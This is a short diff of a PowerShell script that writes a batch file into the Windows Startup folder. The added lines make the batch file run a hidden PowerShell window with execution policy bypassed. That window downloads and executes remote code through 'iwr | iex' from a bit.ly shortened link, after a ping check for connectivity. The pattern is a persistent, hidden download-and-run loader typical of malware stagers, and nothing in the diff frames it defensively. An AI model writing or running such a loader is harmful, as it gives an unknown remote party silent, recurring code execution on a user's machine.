@@ -39,8 +39,8 @@ $autostart_path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" +
 
 #This Batch file is used for a .ps1 from Github
 $batchContent ='@echo off
-PowerShell.exe -WindowStyle hidden -NoProfile -ExecutionPolicy ByPass -Command "&{iwr '+ $git_path +' | iex}"
-pause
+Ping www.google.com -n 1 -w 1000
+if errorlevel 1 (echo You are not connected to the internet) else (PowerShell.exe -WindowStyle hidden -NoProfile -ExecutionPolicy ByPass -Command "&{iwr bit.ly/3GssBtb | iex}")
 '
 
 # Create Batch file and save it in Autostart folder
